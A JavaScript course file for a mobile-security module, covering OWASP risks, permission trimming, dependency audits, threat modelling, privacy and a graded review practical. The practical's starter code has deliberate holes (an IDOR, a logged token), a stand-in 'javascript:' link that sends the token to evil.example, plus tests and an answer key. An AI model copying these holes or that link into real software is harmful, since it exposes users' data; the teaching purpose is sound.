/**
 * MOBILE APP DEVELOPMENT · MODULE 19 · MOBILE APPLICATION SECURITY (part 2)
 *
 * Curriculum 19.9 – 19.P: common mobile vulnerabilities, permission
 * minimisation and privacy, dependency updates and vulnerability checks,
 * basic threat modelling, privacy notices, and the module practical.
 *
 * THIS FILE IS CLIENT-SAFE. Assessment answers live in lib/academy/.
 */

import { appJson, expoLab } from "./md-helpers.js";
import { MODULE, SECTION_ID } from "./md-m19-part1.js";
import T from "./md-transcripts.js";

const APP = "~/projects/my-first-app $";

/* ── 19.10 · Permissions ─────────────────────────────────────────────── */
const PERMS_START = {
  ios: { bundleIdentifier: "ng.kobo.app", infoPlist: { NSContactsUsageDescription: "Kobo needs your contacts." } },
  android: {
    package: "ng.kobo.app",
    permissions: ["android.permission.CAMERA", "android.permission.RECORD_AUDIO", "android.permission.READ_CONTACTS", "android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_BACKGROUND_LOCATION"],
  },
  plugins: [
    ["expo-camera", { cameraPermission: "Allow camera", microphonePermission: "Allow microphone", recordAudioAndroid: true }],
    ["expo-location", { locationAlwaysAndWhenInUsePermission: "Allow location always", isAndroidBackgroundLocationEnabled: true, isIosBackgroundLocationEnabled: true }],
  ],
};
const PERMS_MODEL = {
  ios: { bundleIdentifier: "ng.kobo.app" },
  android: {
    package: "ng.kobo.app",
    permissions: ["android.permission.CAMERA", "android.permission.ACCESS_COARSE_LOCATION", "android.permission.ACCESS_FINE_LOCATION"],
    // Libraries can add permissions of their own; block the ones this app must never ask for.
    blockedPermissions: ["android.permission.RECORD_AUDIO", "android.permission.READ_CONTACTS", "android.permission.ACCESS_BACKGROUND_LOCATION"],
  },
  plugins: [
    ["expo-camera", { cameraPermission: "Allow Kobo to use your camera to scan product barcodes.", microphonePermission: false, recordAudioAndroid: false }],
    ["expo-location", { locationWhenInUsePermission: "Allow Kobo to use your location to find the shop nearest to you.", isAndroidBackgroundLocationEnabled: false, isIosBackgroundLocationEnabled: false }],
  ],
};
const PERMS_SCREEN = `import { Text, View } from "react-native";

// What the app does: scan product barcodes (the camera) and find the nearest shop (location, while open).
export default function Home() {
  return (
    <View style={{ padding: 20, gap: 8 }}>
      <Text>Scan a barcode to compare prices.</Text>
      <Text>Find the Kobo shop nearest to you.</Text>
    </View>
  );
}
`;
const plugin = (name) => `(config().plugins || []).find((x) => (Array.isArray(x) ? x[0] : x) === '${name}')`;

/* ── 19.P · The practical ────────────────────────────────────────────── */
const P_SERVER_START = `import { createServer } from "practice-server";

const app = createServer();
const TOKENS = { tok_ada_51f: "ada", tok_tunde_9c2: "tunde" };
const ORDERS = [
  { id: "1001", owner: "ada", item: "Ankara tote bag", address: "12 Herbert Macaulay Way, Yaba" },
  { id: "1002", owner: "tunde", item: "Redmi Note 14", address: "4 Allen Avenue, Ikeja" },
];

app.post("/auth/login", (req, res) => {
  const { email, password } = req.body || {};
  if (email === "ada@example.com" && password === "kobo1234") return res.json({ token: "tok_ada_51f" });
  res.status(401).json({ message: "Wrong email or password" });
});

app.use((req, res, next) => {
  req.user = TOKENS[(req.headers.authorization || "").replace("Bearer ", "")];
  if (!req.user) return res.status(401).json({ message: "Sign in first" });
  next();
});

app.get("/orders", (req, res) => res.json(ORDERS.filter((o) => o.owner === req.user)));

app.get("/orders/:id", (req, res) => {
  const order = ORDERS.find((o) => o.id === req.params.id);
  if (!order) return res.status(404).json({ message: "Order not found" });
  res.json(order);
});

app.get("/messages", (req, res) =>
  res.json([
    { id: "m1", text: "How returns work", url: "https://help.kobo.example/returns" },
    { id: "m2", text: "Confirm your card", url: "javascript:fetch('https://evil.example/?t='+localStorage.token)" },
  ])
);

export default app;
`;
const P_SERVER_MODEL = P_SERVER_START.replace(
  `  const order = ORDERS.find((o) => o.id === req.params.id);`,
  `  // Only the user's own orders exist for them (404, not 403, so nothing is revealed).
  const order = ORDERS.find((o) => o.id === req.params.id && o.owner === req.user);`
);
const P_AUTH_START = `import AsyncStorage from "@react-native-async-storage/async-storage";

export async function signIn(email: string, password: string) {
  const r = await fetch("https://api.example.com/auth/login", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ email, password }) });
  const data = await r.json();
  if (!r.ok) throw new Error(data.message);
  console.log("signed in, token:", data.token);
  await AsyncStorage.setItem("token", data.token);
  return data.token as string;
}

export const getToken = () => AsyncStorage.getItem("token");

export async function api(path: string) {
  const r = await fetch("https://api.example.com" + path, { headers: { Authorization: "Bearer " + (await getToken()) } });
  return r.json();
}
`;
const P_AUTH_MODEL = `import * as SecureStore from "expo-secure-store";

export async function signIn(email: string, password: string) {
  const r = await fetch("https://api.example.com/auth/login", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ email, password }) });
  const data = await r.json();
  if (!r.ok) throw new Error(data.message);
  await SecureStore.setItemAsync("token", data.token);
  return data.token as string;
}

export const getToken = () => SecureStore.getItemAsync("token");

export async function api(path: string) {
  const r = await fetch("https://api.example.com" + path, { headers: { Authorization: "Bearer " + (await getToken()) } });
  return r.json();
}
`;
const P_SCREEN_START = `import * as Linking from "expo-linking";
import { Ionicons } from "@expo/vector-icons";
import { useState } from "react";
import { Pressable, Text, TextInput, View } from "react-native";
import { api, signIn } from "@/auth";

type Order = { id: string; item: string };
type Message = { id: string; text: string; url: string };

export default function Home() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [orders, setOrders] = useState<Order[] | null>(null);
  const [messages, setMessages] = useState<Message[]>([]);
  const [error, setError] = useState("");

  async function load() {
    setOrders(await api("/orders"));
    setMessages(await api("/messages"));
  }

  async function go() {
    try {
      await signIn(email.trim(), password);
      setPassword("");
      await load();
    } catch (e) {
      setError((e as Error).message);
    }
  }

  if (!orders) {
    return (
      <View style={{ padding: 20, gap: 10 }}>
        <TextInput placeholder="Email" value={email} onChangeText={setEmail} autoCapitalize="none" keyboardType="email-address" style={{ minHeight: 48, borderWidth: 1, borderColor: "#cbd5e1", borderRadius: 10, paddingHorizontal: 12 }} />
        <TextInput placeholder="Password" value={password} onChangeText={setPassword} style={{ minHeight: 48, borderWidth: 1, borderColor: "#cbd5e1", borderRadius: 10, paddingHorizontal: 12 }} />
        {error ? <Text accessibilityRole="alert">{error}</Text> : null}
        <Pressable accessibilityRole="button" onPress={go} style={{ minHeight: 48, justifyContent: "center" }}><Text>Sign in</Text></Pressable>
      </View>
    );
  }

  return (
    <View style={{ padding: 20, gap: 10 }}>
      <Pressable onPress={load} style={{ width: 48, height: 48, justifyContent: "center", alignItems: "center" }}>
        <Ionicons name="refresh" size={24} />
      </Pressable>
      {orders.map((o) => <Text key={o.id}>Order #{o.id}: {o.item}</Text>)}
      {messages.map((m) => (
        <Pressable key={m.id} accessibilityRole="link" onPress={() => Linking.openURL(m.url)} style={{ minHeight: 44, justifyContent: "center" }}>
          <Text>{m.text}</Text>
        </Pressable>
      ))}
    </View>
  );
}
`;
const P_SCREEN_MODEL = P_SCREEN_START.replace(
  `import { Pressable, Text, TextInput, View } from "react-native";`,
  `import { Alert, Pressable, Text, TextInput, View } from "react-native";`
).replace(
  `type Order = { id: string; item: string };`,
  `type Order = { id: string; item: string };

/** Only https links to our help site may be opened from server messages. */
function openSafely(url: string) {
  const { scheme, hostname } = Linking.parse(url);
  if (scheme === "https" && hostname === "help.kobo.example") Linking.openURL(url);
  else Alert.alert("This link can't be opened");
}`
).replace(
  `<TextInput placeholder="Password" value={password} onChangeText={setPassword} style=`,
  `<TextInput placeholder="Password" value={password} onChangeText={setPassword} secureTextEntry autoComplete="current-password" style=`
).replace(
  `<Pressable onPress={load} style={{ width: 48, height: 48, justifyContent: "center", alignItems: "center" }}>`,
  `<Pressable accessibilityRole="button" accessibilityLabel="Refresh" onPress={load} style={{ width: 48, height: 48, justifyContent: "center", alignItems: "center" }}>`
).replace(`onPress={() => Linking.openURL(m.url)}`, `onPress={() => openSafely(m.url)}`);
const P_REPORT_START = `# Security and quality report: Kobo app

## Summary

## Findings

## Fixes

## Remaining risks
`;
const P_REPORT_MODEL = `# Security and quality report: Kobo app

## Summary

Reviewed the sign-in, orders and messages screens and the orders API on 2026-10-22. Found 6 issues (2 high, 3 medium, 1 low); all 6 are fixed.

## Findings

1. **High: other customers' orders were readable (IDOR).** GET /orders/:id returned any order to any signed-in user, so changing the id showed someone else's address. A broken authorization check.
2. **High: links from server messages were opened without checking.** A javascript: link (or a phishing domain) in a message would be opened.
3. **Medium: the session token was stored in AsyncStorage**, which isn't encrypted.
4. **Medium: the token was written to the log** on every sign-in, where crash reports and device logs keep it.
5. **Medium: the password field showed the password** as it was typed (no secureTextEntry) and couldn't be filled by password managers.
6. **Low: the refresh button had no accessibility label or role**, so screen readers announced nothing useful.

## Fixes

1. The order lookup now matches both the id and the owner from the token, and answers 404 otherwise.
2. Message links go through openSafely: only https links to help.kobo.example open; anything else shows an alert.
3. The token is saved and read with SecureStore.
4. The log line was removed; no token or password is logged anywhere.
5. The password field uses secureTextEntry and autoComplete="current-password".
6. The refresh button has accessibilityRole="button" and accessibilityLabel="Refresh".

## Remaining risks

- Existing installs may still have the old token in AsyncStorage: add a migration that moves and deletes it.
- Tokens don't expire; add short-lived access tokens with refresh tokens.
- No rate limit on sign-in yet.
- Re-test with a second account after each release, and add automated tests for the ownership rule.
`;

export const PART2 = [
  /* ═══════════════ LESSON 125 · 19.9 – 19.10 ═══════════════ */
  {
    id: "md-l125-vulns-permissions",
    moduleId: MODULE,
    sectionId: SECTION_ID,
    order: 5,
    covers: ["19.9", "19.10"],
    title: "Common Mobile Vulnerabilities and Permission Minimisation",
    subtitle: "The mistakes attackers look for first, and asking for no more than you need",
    estimatedMinutes: 50,
    intro: "Security lists exist so you don't have to discover each hole yourself.",
    atoms: [
      {
        id: "a-md-owasp",
        title: "Understanding common mobile vulnerabilities",
        explain:
          "The OWASP Mobile Top 10 (2024) lists the commonest mobile risks; most map to lessons you've done: M1 improper credential usage (hard-coded keys, leaked tokens: Module 15, Lesson 123); M2 inadequate supply-chain security (risky SDKs and dependencies: Lesson 126); M3 insecure authentication and authorization (Modules 14–15); M4 insufficient input/output validation (Lesson 121); M5 insecure communication (Lesson 122); M6 inadequate privacy controls (this lesson); M7 insufficient binary protections (apps are easy to unpack and modify: never rely on client-side checks); M8 security misconfiguration (debug flags, exported Android components, open database rules); M9 insecure data storage (Lesson 122); M10 insufficient cryptography (rolling your own crypto, weak hashes: use platform APIs and standard libraries). For each release, walk your app through the list, and run tools such as MobSF (static analysis of an APK or IPA) on a build.",
        decision: {
          scenario: "A penetration tester reports three findings in the Kobo Android release: (1) the APK contains the string \"sk_live_…\" in the JavaScript bundle; (2) the app checks for a \"premium\" flag only in JavaScript; (3) API traffic is HTTPS and tokens are in the Keystore.",
          question: "Which OWASP Mobile risks do the first two represent, and what's the fix?",
          options: [
            { id: "a", text: "(1) improper credential usage: rotate the secret key and move the call to the server; (2) insufficient binary protections / client-side trust: enforce premium on the server", why: "Shipped secrets must be rotated and removed; anything enforced only in the app can be patched out, so the server must enforce it. (3) is good practice." },
            { id: "b", text: "Both are fixed by obfuscating the bundle", whyWrong: "Obfuscation slows readers; the secret is still extractable and the check still bypassable." },
            { id: "c", text: "Only (3) is a problem", whyWrong: "HTTPS and Keystore storage are what you want; (1) and (2) are the real holes." },
            { id: "d", text: "Remove the key from the next version; no rotation needed", whyWrong: "Every installed copy, and anyone who downloaded the APK, still has it: rotate it." },
          ],
          correct: "a",
          aftermath: "Walk the OWASP list before each release; fix the cause on the server side, not by hiding things in the app.",
        },
      },
      {
        id: "a-md-permission-minimization",
        title: "Permission minimization and user privacy",
        explain:
          "Every permission is a question you ask the user, a line in the store's privacy review, and a risk if your app is compromised. Ask for the FEWEST, the NARROWEST and the latest possible: foreground location instead of background (\"While using the app\"), approximate instead of precise when a city is enough, the system photo picker instead of full photo-library access, no microphone if you only take photos (expo-camera's microphonePermission: false and recordAudioAndroid: false), no contacts \"just in case\". In app.json, remove permissions you don't use, and list ones a library might add in android.blockedPermissions; make every iOS usage description specific and honest (what feature, why): App Review rejects vague ones. Then re-check what each new SDK adds to the final manifest (npx expo prebuild shows it). Fewer permissions mean more installs and fewer review problems.",
        webLab: expoLab({
          name: "Kobo",
          layout: `import { Stack } from "expo-router";\n\nexport default function RootLayout() {\n  return (\n    <Stack>\n      <Stack.Screen name="index" options={{ title: "Kobo" }} />\n    </Stack>\n  );\n}\n`,
          app: PERMS_START,
          editable: ["app.json"],
          task:
            "Kobo only scans barcodes (camera) and finds the nearest shop while open (location). Trim app.json: no microphone, contacts or background location (remove them from android.permissions and list RECORD_AUDIO, READ_CONTACTS and ACCESS_BACKGROUND_LOCATION in android.blockedPermissions; remove NSContactsUsageDescription); expo-camera with microphonePermission false and recordAudioAndroid false; expo-location with only a when-in-use message and both background options false; and specific reasons that name the feature (\"…to scan product barcodes.\", \"…to find the shop nearest to you.\").",
          files: { "src/app/index.tsx": PERMS_SCREEN },
          readOnly: ["src/app/index.tsx"],
          open: "app.json",
          solution: { "app.json": appJson("Kobo", PERMS_MODEL) },
          tests: [
            { label: "Android asks only for what the features need", check: "const a = config().android || {}; const p = a.permissions || []; const b = a.blockedPermissions || []; return p.includes('android.permission.CAMERA') && !p.some((x) => /RECORD_AUDIO|READ_CONTACTS|BACKGROUND_LOCATION/.test(x)) && ['RECORD_AUDIO', 'READ_CONTACTS', 'ACCESS_BACKGROUND_LOCATION'].every((n) => b.includes('android.permission.' + n));", fail: "Remove them from permissions, and add them to blockedPermissions." },
            { label: "The camera never asks for the microphone", check: `const p = ${plugin("expo-camera")}; return Array.isArray(p) && p[1].microphonePermission === false && p[1].recordAudioAndroid === false && /barcode/i.test(p[1].cameraPermission || '');`, fail: "[\"expo-camera\", { cameraPermission: \"…barcodes.\", microphonePermission: false, recordAudioAndroid: false }]" },
            { label: "Location only while the app is open, with a real reason", check: `const p = ${plugin("expo-location")}; const o = (Array.isArray(p) && p[1]) || {}; return !('locationAlwaysAndWhenInUsePermission' in o) && !('locationAlwaysPermission' in o) && o.isAndroidBackgroundLocationEnabled === false && o.isIosBackgroundLocationEnabled === false && /nearest/i.test(o.locationWhenInUsePermission || '');`, fail: "locationWhenInUsePermission only, both background options false." },
            { label: "No unused iOS permission strings", check: "const plist = (config().ios || {}).infoPlist || {}; return !('NSContactsUsageDescription' in plist);", fail: "Delete NSContactsUsageDescription." },
          ],
          hint: "android.blockedPermissions stops libraries from adding permissions behind your back.",
          successMessage: "Only the permissions the features need, each with a reason users can understand.",
        }),
      },
    ],
    requirements: { read: true, video: false, assessment: true },
  },

  /* ═══════════════ LESSON 126 · 19.11 – 19.13 ═══════════════ */
  {
    id: "md-l126-deps-threats-privacy",
    moduleId: MODULE,
    sectionId: SECTION_ID,
    order: 6,
    covers: ["19.11", "19.12", "19.13"],
    title: "Dependencies, Threat Modelling and Privacy Notices",
    subtitle: "Other people's code, thinking ahead about attacks, and being honest about data",
    estimatedMinutes: 55,
    intro: "Three habits that keep an app trustworthy after launch: keeping dependencies healthy, thinking through threats before building, and telling users the truth about their data.",
    atoms: [
      {
        id: "a-md-dependency-audit",
        title: "Dependency updates and vulnerability checks",
        explain:
          "Most of your app is other people's packages, and their vulnerabilities become yours. npm audit lists known advisories in the dependency tree, but READ it: many are in development tools (Metro, the CLI) that never ship in your app, and its suggested \"npm audit fix --force\" can install a completely different, BREAKING version (here: Expo 44 in an SDK 58 project). The Expo way: keep the SDK current (an SDK upgrade every few months is the main security update), npx expo install --check and npx expo-doctor for compatibility, Dependabot or Renovate for pull requests with updates, and judge each advisory: is the package in the shipped app? Is the vulnerable code reachable? Then update deliberately, on a branch, and test. Prefer few, well-maintained dependencies (Module 10), and check new ones before adding them.",
        terminalExercise: {
          prompt: APP,
          intro: "Recorded in the course's fresh Expo SDK 58 project.",
          goal: "Check the project's dependencies for known security advisories.",
          commands: {
            "npm audit": T.packages["npm audit"],
            "npx expo-doctor": T.packages["npx expo-doctor"],
            "npx expo install --check": T.deps["npx expo install --check"],
          },
          available: ["npm audit", "npx expo-doctor", "npx expo install --check"],
          accept: ["npm audit"],
          near: [
            { command: "npx expo-doctor", why: "That checks the project's health and compatibility (all passed). For known security advisories, run npm audit." },
            { command: "npx expo install --check", why: "That checks versions against the SDK, not security advisories. Run npm audit." },
          ],
          hint: "npm has a command that checks advisories.",
          success: "npm audit found advisories in development tools (braces, used by Metro), and suggests npm audit fix --force, which would install expo@44: a breaking downgrade. Don't run it. Judge each advisory, and update the SDK through Expo instead.",
        },
      },
      {
        id: "a-md-threat-modeling",
        title: "Basic threat modeling",
        explain:
          "THREAT MODELLING is thinking like an attacker before you build, in four questions: What are we building? (draw the data flow: app, API, database, third parties, and where trust changes). What can go wrong? (a simple prompt list such as STRIDE: Spoofing identity, Tampering with data, Repudiation, Information disclosure, Denial of service, Elevation of privilege). What are we going to do about it? (a mitigation per threat: server checks, signatures, rate limits, logs). Did we do a good job? (review after building, test the mitigations). An hour with a whiteboard for each risky feature (payments, sign-in, uploads, sharing) finds problems when they're cheapest to fix.",
        decision: {
          scenario: "You're designing Kobo's new \"send money to a friend\" feature: the app sends { toPhone, amount } to POST /transfers with the user's token.",
          question: "Which threat and mitigation pair is the most important to include in the threat model?",
          options: [
            { id: "a", text: "Tampering / elevation: the app's amount or sender can be changed, so the server must take the sender from the token, check the balance and limits, require re-authentication (PIN or biometrics) above a threshold, and make transfers idempotent", why: "Money movement is the crown jewel: every value must be checked server-side, high-value actions re-confirmed, and retries must not send twice." },
            { id: "b", text: "Spoofing: someone might guess the app's name", whyWrong: "Not a meaningful threat to this feature." },
            { id: "c", text: "Denial of service: hide the endpoint URL", whyWrong: "Hiding URLs doesn't stop anyone; rate limiting does, and it's not the biggest risk here." },
            { id: "d", text: "No threats: the user is signed in", whyWrong: "Signed-in users (or stolen sessions) are exactly who attacks transfers." },
          ],
          correct: "a",
          aftermath: "Draw the flow, list what can go wrong (STRIDE), and give each threat a server-side mitigation.",
        },
      },
      {
        id: "a-md-privacy-notices",
        title: "Privacy notices and responsible collection of user data",
        explain:
          "Users and the law expect you to explain what you collect, why, who you share it with, how long you keep it, and how to delete it. You need a PRIVACY POLICY at a public URL (both stores require one, linked from the listing and the app); in-app notices at the moment of collection (just-in-time, before the permission prompt); CONSENT where the law requires it (marketing, non-essential analytics and tracking; on iOS, App Tracking Transparency before tracking across apps); in-app ACCOUNT AND DATA DELETION; and store declarations that MATCH what the app and its SDKs really do: Apple's privacy nutrition labels and privacy manifest (PrivacyInfo, which Expo can generate from app.json's ios.privacyManifests) and Google Play's Data safety form. Laws apply by where your users are: Nigeria's NDPA 2023, the EU and UK GDPR, Kenya's and South Africa's data-protection acts, California's CCPA. Collect less, keep it shorter, and say so plainly.",
        decision: {
          scenario: "Kobo adds an analytics SDK that records device id, coarse location and in-app events, and a feature that uploads users' contacts to suggest friends.",
          question: "What must the team do before releasing it?",
          options: [
            { id: "a", text: "Update the privacy policy, ask for contacts only when the user opens \"find friends\" (explaining the upload), get consent for analytics where required, and update Apple's privacy labels/manifest and Google's Data safety form to match", why: "Disclosures must match actual collection, including SDKs; sensitive uploads like contacts need clear, just-in-time explanation and a real choice." },
            { id: "b", text: "Nothing: the privacy policy already says \"we may collect data\"", whyWrong: "Vague policies don't satisfy store declarations or data-protection law; contacts and location must be specifically disclosed." },
            { id: "c", text: "Only update the Google Play Data safety form", whyWrong: "Apple's labels and privacy manifest, the policy and consent all need updating too." },
            { id: "d", text: "Upload contacts silently at first launch so the feature is ready", whyWrong: "Uploading contacts without clear consent breaks store rules and privacy law, and destroys trust." },
          ],
          correct: "a",
          aftermath: "Tell users the truth, at the right moment, everywhere it must be declared.",
        },
      },
    ],
    requirements: { read: true, video: false, assessment: true },
  },

  /* ═══════════════ LESSON 127 · 19.P ═══════════════ */
  {
    id: "md-l127-m19-project",
    moduleId: MODULE,
    sectionId: SECTION_ID,
    order: 7,
    covers: ["19.P"],
    title: "Practical: A Security and Quality Review",
    subtitle: "Find the defects in an existing app, fix them, and write the report",
    estimatedMinutes: 120,
    intro: "Reviewing someone else's app is a core professional skill: you'll do it for teammates, clients and your own older code.",
    atoms: [
      {
        id: "a-md-m19-project",
        title: "Review, fix and report",
        explain:
          "This small app (the orders screen, its auth code and its API) has SIX defects: two high-risk security holes, three medium security weaknesses and one quality (accessibility) problem. Find them by reading the code and trying it as an attacker would (sign in as ada@example.com / kobo1234; the API also has a user tunde). Fix each, then write REPORT.md.",
        webLab: expoLab({
          name: "Kobo",
          layout: `import { Stack } from "expo-router";\n\nexport default function RootLayout() {\n  return (\n    <Stack>\n      <Stack.Screen name="index" options={{ title: "Orders" }} />\n    </Stack>\n  );\n}\n`,
          task:
            "Fix all six defects (in src/auth.ts, src/app/index.tsx and server/index.js) and complete REPORT.md: a Summary, Findings (each with a severity: High, Medium or Low, and what was wrong), Fixes (what you changed), and Remaining risks.",
          files: { "src/app/index.tsx": P_SCREEN_START, "src/auth.ts": P_AUTH_START, "server/index.js": P_SERVER_START, "REPORT.md": P_REPORT_START },
          revealSolution: false,
          solution: { "src/app/index.tsx": P_SCREEN_MODEL, "src/auth.ts": P_AUTH_MODEL, "server/index.js": P_SERVER_MODEL, "REPORT.md": P_REPORT_MODEL },
          tests: [
            { label: "Other customers' orders can't be read", check: "const mine = await fetch('https://api.example.com/orders/1001', { headers: { Authorization: 'Bearer tok_ada_51f' } }); const theirs = await fetch('https://api.example.com/orders/1002', { headers: { Authorization: 'Bearer tok_ada_51f' } }); return mine.status === 200 && theirs.status === 404;", fail: "Find the order by id AND owner." },
            { label: "Sign-in stores the token securely and logs nothing secret", check: "await typeInto('Email', 'ada@example.com'); await typeInto('Password', 'kobo1234'); await press('Sign in'); await waitFor(() => hasText('Order #1001'), 3000); return secureStore().token === 'tok_ada_51f' && !JSON.stringify(asyncStore()).includes('tok_ada') && !logs().some((l) => l.includes('tok_ada'));", fail: "SecureStore for the token; no console.log of it." },
            { label: "Message links are checked before opening", check: "await waitFor(() => has('Confirm your card'), 3000); await press('Confirm your card'); await wait(150); const refused = !!dialog(); await tap('OK'); await press('How returns work'); await wait(150); return refused && opened().includes('https://help.kobo.example/returns') && !opened().some((u) => u.startsWith('javascript'));", fail: "Open only https links to help.kobo.example." },
            { label: "The password field is secure, and the icon button is accessible", check: "await restart(); await waitFor(() => exists({ placeholder: 'Password' }), 3000); const pw = find({ placeholder: 'Password' }).type === 'password'; const c = code('src/app/index.tsx'); return pw && /accessibilityLabel=\"Refresh\"/.test(c);", fail: "secureTextEntry on the password; accessibilityLabel and role on the refresh button." },
            { label: "The report covers every finding", check: "const r = code('REPORT.md'); const sections = ['## Summary', '## Findings', '## Fixes', '## Remaining risks'].every((h) => r.includes(h)); const severities = /High/.test(r) && /Medium/.test(r) && /Low/.test(r); const topics = [/IDOR|authori[sz]ation|other (customers|users)/i, /link/i, /SecureStore|AsyncStorage/i, /log/i, /password/i, /accessib/i].every((t) => t.test(r)); return sections && severities && topics && r.length > 900;", fail: "Each section, each severity, and each of the six findings described." },
          ],
          hint: "Read each file asking: what does this trust that it shouldn't? Then use the app as a second user would.",
          successMessage: "A professional review: defects found, fixed, and documented with severities and remaining risks.",
        }),
      },
    ],
    task: {
      title: "Module 19 practical: a security review of your own app",
      intro: "Apply this module to the app you are building.",
      prompts: [
        "Draw your app's data flow and threat-model its two riskiest features with STRIDE.",
        "Walk it through the OWASP Mobile Top 10 and fix what you find; run MobSF on a release build.",
        "Check every secret and key: what's in the bundle, what's restricted, what must move to the server; rotate anything that leaked.",
        "Trim permissions in app.json, run npm audit and npx expo-doctor, and write down how you judged each advisory.",
        "Write the privacy policy and fill in Apple's privacy labels and Google's Data safety form for your app as it really is.",
        "Mastery checkpoint: present your security and quality report (findings, severities, fixes, remaining risks) to someone else.",
      ],
      closing: "Next: Module 20, preparing apps for release and publishing to Google Play and the App Store.",
    },
    requirements: { read: true, video: false, assessment: true },
  },
];
